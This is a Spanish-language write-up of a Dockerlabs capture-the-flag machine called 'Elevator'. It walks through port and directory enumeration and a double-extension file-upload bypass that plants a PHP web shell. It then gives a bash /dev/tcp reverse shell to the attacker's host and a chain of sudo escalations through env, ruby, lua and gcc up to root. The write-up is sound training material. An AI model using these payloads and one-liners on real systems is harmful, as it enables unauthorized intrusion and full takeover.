
# Writeup Template: Maquina `[ Elevator ]`

- Tags: #Elevator
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Elevator](https://mega.nz/file/iQEkiJhS#**hi8mYfK63xa4LV0twSHPZ9kDrcWRbUvh2avgvF4LXEs**)  Laboratorio diseñado para la escalada de privilegios en entornos Windows y Linux.

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x elevator.zip
sudo bash auto_deploy.sh elevator.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.62 ((Debian)) 
```
---

## Enumeracion de [Servicio Web Principal]
Direccion ULR del servicio
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	Ninguno

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,sh,txt,html
```

- **Hallazgos**:
```bash
/themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
```

Ahora fuzzeamos por esta ruta para ver si encontramos mas informacion:
```bash
gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

Ahora tenemos una ruta nueva:
```bash
/uploads/             (Status: 200) [Size: 762]
```

Tambien tenemos esta ruta donde podemos subir archivos al servidor:
```bash
http://172.17.0.2/themes/archivo.html
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Determinamos que solo esta aplicando la validacion que termine el archivo que subamos en: **( jpg )** asi que podemos intentar un ataque de doble extension:
### Ejecucion del Ataque
Ya capturada la peticion y en el modo **repeater** con **burpsuite** procedemos a cargar esta instraucion despues nos ponemos en escucha:
```bash
# Comandos para explotación
Content-Disposition: form-data; name="file"; filename="cmd.php.jpg"
Content-Type: application/x-php

<?php
  system($_GET["cmd"]);
?>
```

Tenemso ejecucion remota de comandos en el sistema:
```bash
http://172.17.0.2/themes/uploads/6840a9145331c.jpg?cmd=whoami
```
### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

Ahora ejecutamos el archivo subiendolo y en la ruta se cargara nuestro archivo :
```bash
# Reverse shell o acceso inicial
172.17.0.2/themes/uploads/6840a9145331c.jpg?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/env ]`
- Credenciales de usuario: `[ www-data ]:[  ]`

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:

```bash
# Comando para escalar al usuario: ( daphne )
User www-data may run the following commands on be30e8fa0ab7:
    (daphne) NOPASSWD: /usr/bin/env
```

Ahora explotamos el binario:
```bash
sudo -u daphne /usr/bin/env /bin/bash
```

###### Usuario `[ daphne ]`:

```bash
# Comando para escalar al usuario: ( vilma )
User daphne may run the following commands on be30e8fa0ab7:
    (vilma) NOPASSWD: /usr/bin/ash
```

Ahora explotamos el binario:
```bash
sudo -u vilma /usr/bin/ash
```

###### Usuario `[ vulma ]`:

```bash
# Comando para escalar al usuario: ( shaggy )
User vilma may run the following commands on be30e8fa0ab7:
    (shaggy) NOPASSWD: /usr/bin/ruby
```

Ahora explotamos el binario:
```bash
sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/bash"'
```

###### Usuario `[ shaggy ]`:

```bash
# Comando para escalar al usuario: ( fred )
User shaggy may run the following commands on be30e8fa0ab7:
    (fred) NOPASSWD: /usr/bin/lua
```

Ahora explotamos el binario:
```bash
sudo -u fred /usr/bin/lua -e 'os.execute("/bin/bash")'
```

###### Usuario `[ fred ]`:

```bash
# Comando para escalar al usuario: ( scooby )
User fred may run the following commands on be30e8fa0ab7:
    (scooby) NOPASSWD: /usr/bin/gcc
```

Ahora explotamos el binario:
```bash
sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s .
```

###### Usuario `[ scooby ]`:

```bash
# Comando para escalar al usuario: ( root )
User scooby may run the following commands on be30e8fa0ab7:
    (root) NOPASSWD: /usr/bin/sudo
```

Ahora explotamos el binario:
```bash
sudo -u root /usr/bin/sudo /bin/bash
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@be30e8fa0ab7:/var/www/html# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a abusar de la subida de archivos en el servidor
2. Aprendimos a realizar un ataque de doble extension para subir un archivo malcioso

## Recomendaciones de Seguridad
- Validar correctamente la subida de archivos, Junto con las validaciones para las extensiones.